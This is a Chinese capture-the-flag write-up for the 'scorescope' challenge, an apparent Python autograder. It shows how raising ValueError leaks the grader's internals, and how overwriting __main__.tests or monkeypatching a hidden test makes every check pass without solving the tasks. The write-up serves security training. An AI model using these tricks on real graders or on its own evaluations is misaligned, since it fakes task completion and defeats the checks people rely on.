## Web
### scorescope
下载其提供的模板文件，将返回利用valueerror绕过返回的限制

```python
raise ValueError(str(sys.modules))
```

![](attachments/Pasted%20image%2020230914134803.png)

```text
ValueError: {'sys': <module 'sys' (built-in)>, 'builtins': <module 'builtins' (built-in)>, '_frozen_importlib': <module '_frozen_importlib' (frozen)>, '_imp': <module '_imp' (built-in)>, '_thread': <module '_thread' (built-in)>, '_warnings': <module '_warnings' (built-in)>, '_weakref': <module '_weakref' (built-in)>, '_io': <module '_io' (built-in)>, 'marshal': <module 'marshal' (built-in)>, 'posix': <module 'posix' (built-in)>, '_frozen_importlib_external': <module '_frozen_importlib_external' (frozen)>, 'time': <module 'time' (built-in)>, 'zipimport': <module 'zipimport' (frozen)>, '_codecs': <module '_codecs' (built-in)>, 'codecs': <module 'codecs' (frozen)>, 'encodings.aliases': <module 'encodings.aliases' from '/usr/local/lib/python3.11/encodings/aliases.py'>, 'encodings': <module 'encodings' from '/usr/local/lib/python3.11/encodings/__init__.py'>, 'encodings.utf_8': <module 'encodings.utf_8' from '/usr/local/lib/python3.11/encodings/utf_8.py'>, '_signal': <module '_signal' (built-in)>, '_abc': <module '_abc' (built-in)>, 'abc': <module 'abc' (frozen)>, 'io': <module 'io' (frozen)>, '__main__': <module '__main__' from '/app/run'>, '_stat': <module '_stat' (built-in)>, 'stat': <module 'stat' (frozen)>, '_collections_abc': <module '_collections_abc' (frozen)>, 'genericpath': <module 'genericpath' (frozen)>, 'posixpath': <module 'posixpath' (frozen)>, 'os.path': <module 'posixpath' (frozen)>, 'os': <module 'os' (frozen)>, '_sitebuiltins': <module '_sitebuiltins' (frozen)>, 'pwd': <module 'pwd' (built-in)>, '_distutils_hack': <module '_distutils_hack' from '/usr/local/lib/python3.11/site-packages/_distutils_hack/__init__.py'>, 'site': <module 'site' (frozen)>, 'types': <module 'types' from '/usr/local/lib/python3.11/types.py'>, '_operator': <module '_operator' (built-in)>, 'operator': <module 'operator' from '/usr/local/lib/python3.11/operator.py'>, 'itertools': <module 'itertools' (built-in)>, 'keyword': <module 'keyword' from '/usr/local/lib/python3.11/keyword.py'>, 'reprlib': <module 'reprlib' from '/usr/local/lib/python3.11/reprlib.py'>, '_collections': <module '_collections' (built-in)>, 'collections': <module 'collections' from '/usr/local/lib/python3.11/collections/__init__.py'>, '_functools': <module '_functools' (built-in)>, 'functools': <module 'functools' from '/usr/local/lib/python3.11/functools.py'>, 'enum': <module 'enum' from '/usr/local/lib/python3.11/enum.py'>, '_sre': <module '_sre' (built-in)>, 're._constants': <module 're._constants' from '/usr/local/lib/python3.11/re/_constants.py'>, 're._parser': <module 're._parser' from '/usr/local/lib/python3.11/re/_parser.py'>, 're._casefix': <module 're._casefix' from '/usr/local/lib/python3.11/re/_casefix.py'>, 're._compiler': <module 're._compiler' from '/usr/local/lib/python3.11/re/_compiler.py'>, 'copyreg': <module 'copyreg' from '/usr/local/lib/python3.11/copyreg.py'>, 're': <module 're' from '/usr/local/lib/python3.11/re/__init__.py'>, '_json': <module '_json' from '/usr/local/lib/python3.11/lib-dynload/_json.cpython-311-x86_64-linux-gnu.so'>, 'json.scanner': <module 'json.scanner' from '/usr/local/lib/python3.11/json/scanner.py'>, 'json.decoder': <module 'json.decoder' from '/usr/local/lib/python3.11/json/decoder.py'>, 'json.encoder': <module 'json.encoder' from '/usr/local/lib/python3.11/json/encoder.py'>, 'json': <module 'json' from '/usr/local/lib/python3.11/json/__init__.py'>, 'collections.abc': <module 'collections.abc' from '/usr/local/lib/python3.11/collections/abc.py'>, 'token': <module 'token' from '/usr/local/lib/python3.11/token.py'>, 'tokenize': <module 'tokenize' from '/usr/local/lib/python3.11/tokenize.py'>, 'linecache': <module 'linecache' from '/usr/local/lib/python3.11/linecache.py'>, 'textwrap': <module 'textwrap' from '/usr/local/lib/python3.11/textwrap.py'>, 'contextlib': <module 'contextlib' from '/usr/local/lib/python3.11/contextlib.py'>, 'traceback': <module 'traceback' from '/usr/local/lib/python3.11/traceback.py'>, 'unittest.util': <module 'unittest.util' from '/usr/local/lib/python3.11/unittest/util.py'>, 'unittest.result': <module 'unittest.result' from '/usr/local/lib/python3.11/unittest/result.py'>, '_heapq': <module '_heapq' from '/usr/local/lib/python3.11/lib-dynload/_heapq.cpython-311-x86_64-linux-gnu.so'>, 'heapq': <module 'heapq' from '/usr/local/lib/python3.11/heapq.py'>, 'difflib': <module 'difflib' from '/usr/local/lib/python3.11/difflib.py'>, '_weakrefset': <module '_weakrefset' from '/usr/local/lib/python3.11/_weakrefset.py'>, 'weakref': <module 'weakref' from '/usr/local/lib/python3.11/weakref.py'>, 'copy': <module 'copy' from '/usr/local/lib/python3.11/copy.py'>, '_ast': <module '_ast' (built-in)>, 'ast': <module 'ast' from '/usr/local/lib/python3.11/ast.py'>, '_opcode': <module '_opcode' from '/usr/local/lib/python3.11/lib-dynload/_opcode.cpython-311-x86_64-linux-gnu.so'>, 'opcode': <module 'opcode' from '/usr/local/lib/python3.11/opcode.py'>, 'dis': <module 'dis' from '/usr/local/lib/python3.11/dis.py'>, 'importlib._bootstrap': <module '_frozen_importlib' (frozen)>, 'importlib._bootstrap_external': <module '_frozen_importlib_external' (frozen)>, 'warnings': <module 'warnings' from '/usr/local/lib/python3.11/warnings.py'>, 'importlib': <module 'importlib' from '/usr/local/lib/python3.11/importlib/__init__.py'>, 'importlib.machinery': <module 'importlib.machinery' (frozen)>, 'inspect': <module 'inspect' from '/usr/local/lib/python3.11/inspect.py'>, 'dataclasses': <module 'dataclasses' from '/usr/local/lib/python3.11/dataclasses.py'>, 'pprint': <module 'pprint' from '/usr/local/lib/python3.11/pprint.py'>, 'unittest.case': <module 'unittest.case' from '/usr/local/lib/python3.11/unittest/case.py'>, 'unittest.suite': <module 'unittest.suite' from '/usr/local/lib/python3.11/unittest/suite.py'>, 'fnmatch': <module 'fnmatch' from '/usr/local/lib/python3.11/fnmatch.py'>, 'unittest.loader': <module 'unittest.loader' from '/usr/local/lib/python3.11/unittest/loader.py'>, 'gettext': <module 'gettext' from '/usr/local/lib/python3.11/gettext.py'>, 'argparse': <module 'argparse' from '/usr/local/lib/python3.11/argparse.py'>, 'signal': <module 'signal' from '/usr/local/lib/python3.11/signal.py'>, 'unittest.signals': <module 'unittest.signals' from '/usr/local/lib/python3.11/unittest/signals.py'>, 'unittest.runner': <module 'unittest.runner' from '/usr/local/lib/python3.11/unittest/runner.py'>, 'unittest.main': <module 'unittest.main' from '/usr/local/lib/python3.11/unittest/main.py'>, 'unittest': <module 'unittest' from '/usr/local/lib/python3.11/unittest/__init__.py'>, 'importlib._abc': <module 'importlib._abc' from '/usr/local/lib/python3.11/importlib/_abc.py'>, 'ntpath': <module 'ntpath' (frozen)>, 'errno': <module 'errno' (built-in)>, 'urllib': <module 'urllib' from '/usr/local/lib/python3.11/urllib/__init__.py'>, 'urllib.parse': <module 'urllib.parse' from '/usr/local/lib/python3.11/urllib/parse.py'>, 'pathlib': <module 'pathlib' from '/usr/local/lib/python3.11/pathlib.py'>, 'zlib': <module 'zlib' from '/usr/local/lib/python3.11/lib-dynload/zlib.cpython-311-x86_64-linux-gnu.so'>, '_compression': <module '_compression' from '/usr/local/lib/python3.11/_compression.py'>, '_bz2': <module '_bz2' from '/usr/local/lib/python3.11/lib-dynload/_bz2.cpython-311-x86_64-linux-gnu.so'>, 'bz2': <module 'bz2' from '/usr/local/lib/python3.11/bz2.py'>, '_lzma': <module '_lzma' from '/usr/local/lib/python3.11/lib-dynload/_lzma.cpython-311-x86_64-linux-gnu.so'>, 'lzma': <module 'lzma' from '/usr/local/lib/python3.11/lzma.py'>, 'shutil': <module 'shutil' from '/usr/local/lib/python3.11/shutil.py'>, 'math': <module 'math' from '/usr/local/lib/python3.11/lib-dynload/math.cpython-311-x86_64-linux-gnu.so'>, '_bisect': <module '_bisect' from '/usr/local/lib/python3.11/lib-dynload/_bisect.cpython-311-x86_64-linux-gnu.so'>, 'bisect': <module 'bisect' from '/usr/local/lib/python3.11/bisect.py'>, '_random': <module '_random' from '/usr/local/lib/python3.11/lib-dynload/_random.cpython-311-x86_64-linux-gnu.so'>, '_sha512': <module '_sha512' from '/usr/local/lib/python3.11/lib-dynload/_sha512.cpython-311-x86_64-linux-gnu.so'>, 'random': <module 'random' from '/usr/local/lib/python3.11/random.py'>, 'tempfile': <module 'tempfile' from '/usr/local/lib/python3.11/tempfile.py'>, '_typing': <module '_typing' from '/usr/local/lib/python3.11/lib-dynload/_typing.cpython-311-x86_64-linux-gnu.so'>, 'typing.io': <class 'typing.io'>, 'typing.re': <class 'typing.re'>, 'typing': <module 'typing' from '/usr/local/lib/python3.11/typing.py'>, 'importlib.resources.abc': <module 'importlib.resources.abc' from '/usr/local/lib/python3.11/importlib/resources/abc.py'>, 'importlib.resources._adapters': <module 'importlib.resources._adapters' from '/usr/local/lib/python3.11/importlib/resources/_adapters.py'>, 'importlib.resources._common': <module 'importlib.resources._common' from '/usr/local/lib/python3.11/importlib/resources/_common.py'>, 'importlib.resources._legacy': <module 'importlib.resources._legacy' from '/usr/local/lib/python3.11/importlib/resources/_legacy.py'>, 'importlib.resources': <module 'importlib.resources' from '/usr/local/lib/python3.11/importlib/resources/__init__.py'>, 'importlib.abc': <module 'importlib.abc' from '/usr/local/lib/python3.11/importlib/abc.py'>, 'importlib.util': <module 'importlib.util' (frozen)>, 'cython_runtime': <module 'cython_runtime'>, '_cython_3_0_2': <module '_cython_3_0_2'>, 'seccomp': <module 'seccomp' from '/usr/local/lib/python3.11/site-packages/seccomp-2.5.4-py3.11-linux-x86_64.egg/seccomp.cpython-311-x86_64-linux-gnu.so'>, 'util': <module 'util' from '/app/util.py'>, 'test_1_add': <module 'test_1_add' from '/app/tests/test_1_add.py'>, 'test_2_longest': <module 'test_2_longest' from '/app/tests/test_2_longest.py'>, 'test_3_common': <module 'test_3_common' from '/app/tests/test_3_common.py'>, 'test_4_favorite': <module 'test_4_favorite' from '/app/tests/test_4_favorite.py'>, 'test_5_factor': <module 'test_5_factor' from '/app/tests/test_5_factor.py'>, '_hashlib': <module '_hashlib' from '/usr/local/lib/python3.11/lib-dynload/_hashlib.cpython-311-x86_64-linux-gnu.so'>, '_blake2': <module '_blake2' from '/usr/local/lib/python3.11/lib-dynload/_blake2.cpython-311-x86_64-linux-gnu.so'>, 'hashlib': <module 'hashlib' from '/usr/local/lib/python3.11/hashlib.py'>, 'test_6_preimage': <module 'test_6_preimage' from '/app/tests/test_6_preimage.py'>, 'test_7_magic': <module 'test_7_magic' from '/app/tests/test_7_magic.py'>, 'test_8_hidden': <module 'test_8_hidden' from '/app/tests/test_8_hidden.py'>, 'submission': <module 'submission'>}
```

```python
raise ValueError(str(dir(test_8_hidden)))
```


当正常写了add的功能后

![](attachments/Pasted%20image%2020230914140920.png)

检测通过

用vars来查看`__main__`

```
ValueError: {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f64fdb28b50>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/app/run', '__cached__': None, 'json': <module 'json' from '/usr/local/lib/python3.11/json/__init__.py'>, 'sys': <module 'sys' (built-in)>, 'TestCase': <class 'unittest.case.TestCase'>, 'TestLoader': <class 'unittest.loader.TestLoader'>, 'TextTestRunner': <class 'unittest.runner.TextTestRunner'>, 'SilentResult': <class 'util.SilentResult'>, 'SubmissionImporter': <class 'util.SubmissionImporter'>, 'suite': <unittest.suite.TestSuite tests=[None, <unittest.suite.TestSuite tests=[None, <unittest.suite.TestSuite tests=[None, None, None, <test_2_longest.TestLongest testMethod=test_longest_single>]>]>, <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_3_common.TestCommon testMethod=test_common_consecutive>, <test_3_common.TestCommon testMethod=test_common_empty>, <test_3_common.TestCommon testMethod=test_common_many>, <test_3_common.TestCommon testMethod=test_common_nonconsecutive>, <test_3_common.TestCommon testMethod=test_common_single>]>]>, <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_4_favorite.TestFavorite testMethod=test_favorite>]>]>, <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_5_factor.TestFactor testMethod=test_factor_bigger>, <test_5_factor.TestFactor testMethod=test_factor_large>, <test_5_factor.TestFactor testMethod=test_factor_small>]>]>, <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_6_preimage.TestPreimage testMethod=test_preimage_a>, <test_6_preimage.TestPreimage testMethod=test_preimage_b>]>]>, <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, <unittest.suite.TestSuite tests=[<test_7_magic.TestMagic testMethod=test_magic_a>, <test_7_magic.TestMagic testMethod=test_magic_b>, <test_7_magic.TestMagic testMethod=test_magic_c>]>]>, <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<test_8_hidden.TestHidden testMethod=test_hidden>]>]>]>, 'tests': ['test_hidden', 'test_magic_a', 'test_magic_b', 'test_magic_c', 'test_preimage_a', 'test_preimage_b', 'test_factor_bigger', 'test_factor_large', 'test_factor_small', 'test_favorite', 'test_common_consecutive', 'test_common_empty', 'test_common_many', 'test_common_nonconsecutive', 'test_common_single', 'test_longest_empty', 'test_longest_multiple', 'test_longest_multiple_tie', 'test_longest_single', 'test_add_mixed', 'test_add_negative', 'test_add_positive'], 'stack': [], 'current': <unittest.suite.TestSuite tests=[None, None, None]>, 'test': <test_1_add.TestAdd testMethod=test_add_positive>, 'submission': "# DICE 1001\n# Homework 3\n#\n# @author [full name]\n# @student_id [student id]\n#\n# Collaborators:\n# - [list collaborators here]\n#\n# Resources:\n# - [list resources consulted]\n\nimport sys\nimport __main__\nimport test_1_add\nimport test_2_longest\nimport test_3_common\nimport test_4_favorite\nimport test_5_factor\nimport test_6_preimage\nimport test_7_magic\nimport test_8_hidden\ndef add(a, b):\n    '''\n    Return the sum of a and b.\n\n    Parameters:\n        a (int): The first number to add.\n        b (int): The second number to add.\n\n    Returns:\n        int: The sum of a and b.\n    '''\n\n    ######## YOUR CODE ########\n\n    #test_8_hidden.TestHidden.hidden_test = lambda s: True\n    return a+b\n    raise ValueError(vars(__main__))\n\n\n    ###########################\n\ndef longest(words):\n    '''\n    Return the longest word in a list of words.\n    When there are multiple words of the same length, return the first.\n\n    Parameters:\n        words (list): A list of words.\n\n    Returns:\n        str: The longest word in the list.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise ValueError(vars(__main__))\n\n\n    ###########################\n\ndef common(a, b):\n    '''\n    Return the longest common subsequence of two strings.\n\n    Parameters:\n        a (str): The first string.\n        b (str): The second string.\n\n    Returns:\n        str: The longest common subsequence of a and b.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise ValueError(vars(__main__))\n\n\n    ###########################\n\ndef favorite():\n    '''\n    Return your favorite number. Must be the same as my favorite number.\n\n    Returns:\n        int: Your favorite number.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise ValueError(str(dir(test_4_favorite)))\n\n\n    ###########################\n\ndef factor(n):\n    '''\n    Given an integer, find two integers whose product is n.\n\n    Parameters:\n        n (int): The number to factor.\n\n    Returns:\n        Tuple[int, int]: Two satisfying integers.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise ValueError(str(dir(test_5_factor)))\n\n\n    ###########################\n\ndef preimage(hash):\n    '''\n    Given a sha256 hash, find a preimage (bytes).\n\n    Parameters:\n        hash (str): The sha256 hash of a string in hex.\n\n    Returns:\n        bytes: A preimage of the hash.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise ValueError(str(dir(test_6_preimage)))\n\n\n    ###########################\n\ndef magic():\n    '''\n    Guess the random number I am thinking of.\n\n    Returns:\n        int: Your guess.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise ValueError(str(dir(test_8_hidden.TestHidden.test_hidden)))\n\n\n    ###########################\ndef hidden():\n    raise ValueError(str(dir(test_8_hidden.TestHidden.test_hidden)))", 'f': <_io.TextIOWrapper name='/dev/null' mode='w' encoding='utf-8'>, 'stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>, 'stderr': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>}
```

在tests数组中有这22个检查项，tests中有啥就检查啥

![](attachments/Pasted%20image%2020230914143857.png)

直接将检测项覆盖 通过22项可以拿flag

```python
__main__.tests = ['test_add_positive'] * 22
```

![](attachments/Pasted%20image%2020230914144030.png)

